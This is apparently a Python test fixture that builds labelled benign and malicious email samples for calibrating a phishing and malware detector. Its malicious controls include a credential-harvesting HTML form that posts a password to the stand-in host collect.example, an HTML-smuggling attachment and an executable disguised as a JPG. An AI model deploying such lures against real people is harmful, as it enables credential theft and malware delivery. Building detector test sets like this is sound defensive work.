"""Benign capabilities and malicious controls. All content is analyzed statically."""

from __future__ import annotations

import io
import zipfile

import make_samples
from pypdf import PdfWriter

from services.parsers.mail.common import ParseContext, RawAttachment, build_row

SETTINGS = {"internal_domains": ["interne.fr"], "trusted_senders": [], "vip_names": ["lefevre marie"]}
CSV_REPORT = b"""<!doctype html><html><head><title>Weekly report</title></head><body><h1>Weekly report</h1><p>Export the table as CSV.</p><button onclick="exportCsv()">Export CSV</button><script>function exportCsv(){const b=new Blob(['month,total\\nSeptember,42'],{type:'text/csv'});const a=document.createElement('a');a.href=URL.createObjectURL(b);a.download='report.csv';a.click();URL.revokeObjectURL(a.href);}</script></body></html>"""


def message(subject, body="The requested report is attached. Kind regards.", attachments=(), reply_to=None):
    headers = [
        ("From", "Reports <reports@vendor-news.com>"),
        ("To", "Alice <alice@interne.fr>"),
        ("Subject", subject),
        ("Date", "Sat, 5 Sep 2026 10:00:00 +0000"),
        ("Message-ID", "<calibration@vendor-news.com>"),
        ("Received", "from mail.vendor-news.com ([93.184.216.34]) by mx.interne.fr; Sat, 5 Sep 2026 10:00:01 +0000"),
        (
            "Authentication-Results",
            "mx.interne.fr; spf=pass smtp.mailfrom=vendor-news.com; dkim=pass header.d=vendor-news.com; dmarc=pass header.from=vendor-news.com",
        ),
    ]
    if reply_to:
        headers.append(("Reply-To", reply_to))
    return build_row(headers, body, None, list(attachments), ParseContext(internal_domains=SETTINGS["internal_domains"]))


def examples():
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("report.html", "<!doctype html><html><body><h1>Weekly report</h1><p>All work completed.</p></body></html>")
    pdf = PdfWriter()
    pdf.add_blank_page(width=595, height=842)
    pdf.add_js("var total = 42;")
    pb = io.BytesIO()
    pdf.write(pb)
    controls = [
        ("static_html_zip", "benign", message("Static HTML report in ZIP", attachments=[RawAttachment("report.zip", buf.getvalue())])),
        ("pdf_javascript", "benign", message("PDF with harmless JavaScript", attachments=[RawAttachment("form.pdf", pb.getvalue())])),
        ("html_csv_export", "benign", message("HTML CSV export", attachments=[RawAttachment("report.html", CSV_REPORT)])),
        (
            "bank_notice",
            "benign",
            message("New bank details", "Following our bank merger, here are our new bank details. Verify using your usual contact number."),
        ),
        (
            "invoice_replyto",
            "benign",
            message("Invoice", "Here is the invoice for work completed last month.", reply_to="Accounts <accounts-example@gmail.com>"),
        ),
        ("smuggled_payload", "malicious", message("Requested document", attachments=[RawAttachment("document.html", make_samples.html_smuggle())])),
        ("disguised_executable", "malicious", message("Requested image", attachments=[RawAttachment("photo.jpg", b"MZ" + b"\0" * 300)])),
        (
            "credential_harvest",
            "malicious",
            message(
                "Requested document",
                attachments=[
                    RawAttachment(
                        "signin.html",
                        b'<html><body><form action="https://collect.example/submit"><input type="password" name="password"><button>Continue</button></form></body></html>',
                    )
                ],
            ),
        ),
    ]
    return [{"name": name, "label": label, "row": row} for name, label, row in controls]
